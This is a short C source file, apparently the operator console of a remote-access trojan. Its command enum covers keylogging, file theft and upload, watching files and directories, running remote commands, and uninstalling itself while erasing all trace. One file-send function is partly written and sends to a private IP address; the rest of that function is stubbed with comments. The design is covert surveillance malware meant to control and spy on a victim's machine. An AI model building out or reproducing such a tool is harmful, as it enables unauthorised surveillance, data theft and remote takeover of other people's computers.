#include "commands.h"
#include "network.h"

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

enum command_type {
    CMD_UNINSTALL = 0,              // tell runner to erase all trace including itself

    CMD_REQ_FILE_NAME,              // command to request a file by file name
    REP_REQ_FILE_NAME,              // reply to a request for a file (file name)
    REP_REQ_FILE_DATA,              // reply to a request for a file (data)

    CMD_SEND_FILE_NAME,             // command to send a file (file name)
    CMD_SEND_FILE_DATA,             // command to send a file (data)

    CMD_START_KL,                   // command to start keylogger
    CMD_START_WATCH_FILE,           // command to start watching file
    CMD_START_WATCH_DIR,            // command to start watching dir
    CMD_STOP,                       // command to stop whichever ongoing command it's doing

    CMD_REMOTE_RUN,                 // command to run a command line

    CMD_DISCONNECT                  // command to tell runner to go back to sleep
};

int prompt_stdin(char *buffer, int buf_size) {
    if (fgets(buffer, buf_size, stdin) != NULL) {
        buffer[strcspn(buffer, "\n")] = '\0';
        return 0;
    }
    return -1;
}

int cmd_send_file(struct Context *ctx) {
    const int BUF_SIZE = 256;
    char file_path[BUF_SIZE];
    printf("Enter relative file path: ");
    prompt_stdin(file_path, BUF_SIZE);
    printf("File path: %s\n", file_path);

    // send CMD_SEND_FILE_NAME
    send_packet(ctx, "10.0.0.5");
    // send file name
    // send TERM
    // send CMD_SEND_FILE_DATA
    // send file data
    // send TERM
    // wait

    return 0;
}

